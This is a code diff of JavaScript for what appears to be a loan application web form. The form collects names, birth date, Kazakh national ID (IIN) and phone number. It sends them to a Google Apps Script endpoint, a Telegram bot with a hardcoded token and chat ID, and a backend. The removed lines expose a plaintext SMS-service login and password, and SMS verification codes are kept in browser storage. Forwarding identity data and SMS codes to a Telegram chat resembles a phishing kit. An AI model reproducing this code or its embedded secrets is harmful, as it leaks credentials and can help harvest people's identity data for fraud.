@@ -1055,6 +1055,22 @@ fetch("https://script.google.com/macros/s/AKfycbwYgPlzKrpfbcnT1WozjeIUaYrpZdrw6k
   body: JSON.stringify({ surname, name, patronymic, birth, iin, phone })
 });
 
+// 📡 Отправка в backend на localhost
+fetch("http://localhost:3000/api/apply", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({ surname, name, patronymic, birth, iin, phone })
+})
+.then(res => res.json())
+.then(data => {
+  console.log("✅ Backend принял данные:", data);
+})
+.catch(err => {
+  console.error("❌ Ошибка при отправке на backend:", err);
+});
+
 // Отправка в Telegram
 const tgToken = "7983362810:AAHqWas3J7PJ6cR5feBgJdXiHpxr5Gqvl8o";
 const chatId = "774355546";
@@ -1072,22 +1088,26 @@ showSMSModal();
 localStorage.setItem('sms_code', code); // Сохраняем его
 
 // Отправляем SMS
-const smsUrl = `https://smsc.kz/sys/send.php?login=islam775&psw=egieV0695&phones=${phone.replace(/\D/g, '')}&mes=Код подтверждения: ${code}&fmt=1`;
-
-fetch(smsUrl)
-  .then(res => res.json())
-  .then(data => {
-    if (data.id > 0) {
-      console.log("📲 SMS отправлено успешно");
-      showSMSModal(); // Открываем модалку
-    } else {
-      alert("Ошибка при отправке SMS: " + data.error);
-    }
-  })
-  .catch(err => {
-    console.error("Ошибка запроса SMS:", err);
-    alert("Ошибка отправки SMS. Попробуйте позже.");
-  });
+// Отправляем на backend
+fetch("https://zaim-backend.onrender.com/send-sms", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({ phone, code })
+})
+.then(res => {
+  if (res.ok) {
+    console.log("📲 SMS отправлено через backend");
+    showSMSModal();
+  } else {
+    alert("Ошибка при отправке SMS.");
+  }
+})
+.catch(err => {
+  console.error("Ошибка запроса на backend:", err);
+  alert("Ошибка отправки SMS. Попробуйте позже.");
+});
     showSMSModal();
   });
   </script>
